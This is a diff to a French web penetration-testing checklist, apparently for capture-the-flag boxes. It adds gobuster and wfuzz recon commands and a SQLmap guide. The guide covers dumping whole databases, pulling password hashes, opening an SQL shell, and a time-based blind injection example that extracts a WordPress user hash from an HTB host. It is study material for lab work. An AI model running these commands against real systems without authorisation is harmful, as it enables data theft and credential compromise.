@@ -6,7 +6,6 @@
    2. Ajouter l'ip / nom de domaine dans /etc/hosts
    2. Lancer en parralèlle les actions de la rubrique "Scanning"
    3. Regarder tous les liens du site
-   4. Observer les en-têtes HTTP
    4. Noter tous les sous domaines
    5. Ajouter tous les sous domaines à /etc/hosts
    6. Si site https, regarder les infos du certificat, nottament la rubrique Issuer qui peut fournir des infos
@@ -21,23 +20,23 @@
 *Prérequis: Dictionnaires SecList - https://github.com/danielmiessler/SecLists.git*   
 <code>
 gobuster dir -u http://@ip_cible -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
-</code>
+</code>  
 Pour chaque Vhost découvert, les ajouter dans /etc/hosts.
 
 ### Recherche de répertoires
 <code> 
 gobuster dir -u http://@ip_cible/dir -w /usr/share/SecLists/Discovery/Web-Content/raft-small-directories.txt
-</code>
+</code>  
 
 ### Recherche de fichiers
 <code>
 gobuster dir -u http://@ip_cible -w /usr/share/SecLists/Discovery/Web-Content/raft-small-files.txt
-</code>
+</code>  
 
 ### Fuzz d'un paramètre
 <code>
 wfuzz --hh=22 -c -w /usr/share/dirb/wordlists/big.txt http://$target_url/action.php?FUZZ=random
-</code>
+</code>  
 Options:  
 –hh taille de la réponse (quand il y a une erreur)<br/>
 -c (Output with colors)<br/>
@@ -55,9 +54,77 @@ Parcourir le site à la recherche d'élément modifiables par l'utilisateur. Ces
 ## Recherche de vulnérabilités
 Pour chaque entrée utilisateur rechercher les éventuelles vulnérabilités:
 ### Injection SQL
+L'outil SQLmap est fortement recommandé pour rechercher des vulnérabilités SQL.
+### Utilisation
+Utilisation de SQLmap en ligne de commandes :
+#### Scann et énumération
+ ```sql
+  sqlmap --url="http://localhost/index.php?page\=user-info.php" --data="username=asdf&password=asdf&user-info-php-submit-button=Login" -p “username” --banner
+--url : permet de spécifier la page sur laquelle on souhaite réaliser les tests d'injection
+--data : sont les paramètres à tester
+--banner : recherche de bannière - Permet de rechercher quel type de base de données est utilisée
+-p : permet de spécifier quel paramètre on souhaite tester
+--dbs= : permets de spécifier le type de base de données
+ ```
+Il est également possible d'utiliser une requête comme base:  
+- Récupérer  une requête POST avec le parmaètre à cibler.Soit avec burp, soit en utilisant la console développeur.
+- Créer un fichier dans lequel on colle la requête.
+```sql
+sqlmap -r /chemin/fichier_contenant_la_requete -p parametre_a_tester
+```
+#### Exploitation
+Si une injection est fonctionnelle on va pouvoir l'exploiter avec les options suivantes :
+```console
+--dbs pour spécifier le type de base de données
+--tables pour spécifier les noms des tables en base de données
+--columns pour spécifier les noms des colonnes des tables
+--users pour récupérer les utilisateur
+--passwords pour récupérer les hashs de mdp
+--current-user
+--current-db
+--hostname
+--dbs énumère les bases de données
+```
 
+Pour récupérer l'intégralité de la base de données
+```console
+--dump-all
+```
+
+On peut injecter une requête sql :
+```console
+--sql-query=
+```
+
+Ou générer un shell :
+```console
+--sql-shell
+```
+
+### Cas particulier
+#### Blind time based
+Les injections de type blind time based, sont extrêment lente. Il n'est donc pas possible de dump les données à cause du temps énorme nécessaire.
+Il est dans ce cas recommandé de se concentré uniquement sur les données nécessaires:
+- Noms des bases de données.
+- Mot de passe d'un utilisateur précis.  
+Exemple:
+```console
+sqlmap --url "https://phoenix.htb/forum/?subscribe_topic=*" --keep-alive --dbms=mysql -
+-risk 3 --technique=TB --thread=10 --random-agent --level 3 -D wordpress -T wp_users --
+sql-query="select user_pass from wp_users where ID = 1"
+```
+L'option --hex peut être utilisé pour réduire le temps de recherche
+
+
+
+### Ressources:
+Utilisation avancée de SQLmap:  
+https://connect.ed-diamond.com/MISC/misc-062/utilisation-avancee-de-sqlmap
 ### Injection XSS
 
+### XSRF
+- Classic
+- Via XSS (voi OverGraph)  
 ### Server Side Template Injection
 
 ## Portail d'authentification
